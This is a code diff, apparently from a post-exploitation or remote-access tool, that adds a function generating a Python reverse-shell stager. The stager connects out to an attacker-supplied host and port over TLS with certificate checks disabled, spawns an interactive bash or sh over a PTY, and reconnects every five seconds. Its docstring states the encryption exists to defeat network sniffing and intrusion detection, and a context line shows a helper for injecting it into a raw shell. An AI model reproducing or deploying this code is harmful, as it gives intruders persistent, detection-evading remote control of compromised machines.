@@ -43,6 +43,41 @@ def python_stager(lhost: str, port: int, token: str) -> str:
     )
 
 
+def python_tls_stager(lhost: str, port: int, token: str) -> str:
+    """Like python_stager but the channel is TLS-encrypted (defeats on-wire sniffing/IDS).
+    Handles the select+SSL buffering caveat via `pending()` so no output is missed."""
+    return (
+        'import socket,os,pty,select,time,signal,ssl\n'
+        f'T="{token}";H="{lhost}";P={port}\n'
+        'while 1:\n'
+        ' s=None;pid=0\n'
+        ' try:\n'
+        '  raw=socket.socket();raw.connect((H,P))\n'
+        '  s=ssl._create_unverified_context().wrap_socket(raw,server_hostname=H)\n'
+        '  s.send(b"RECCE1 "+T.encode()+b"\\n")\n'
+        '  pid,fd=pty.fork()\n'
+        '  if pid==0:os.execv("/bin/sh",["/bin/sh","-c","exec bash -i 2>/dev/null||exec sh -i"])\n'
+        '  while 1:\n'
+        '   r=select.select([s,fd],[],[],1)[0]\n'
+        '   if s in r or s.pending():\n'
+        '    d=s.recv(4096)\n'
+        '    if not d:break\n'
+        '    os.write(fd,d)\n'
+        '   if fd in r:\n'
+        '    d=os.read(fd,1024)\n'
+        '    if not d:break\n'
+        '    s.send(d)\n'
+        ' except Exception:pass\n'
+        ' try:\n'
+        '  if pid>0:os.kill(pid,signal.SIGKILL)\n'
+        ' except:pass\n'
+        ' try:\n'
+        '  if s:s.close()\n'
+        ' except:pass\n'
+        ' time.sleep(5)'
+    )
+
+
 def upgrade_command(lhost: str, port: int, token: str) -> str:
     """A single line to inject into a RAW shell: pick the first available python and background
     the reconnecting-PTY stager. Detection (pwncat-style) tries python3 → python → python2, so
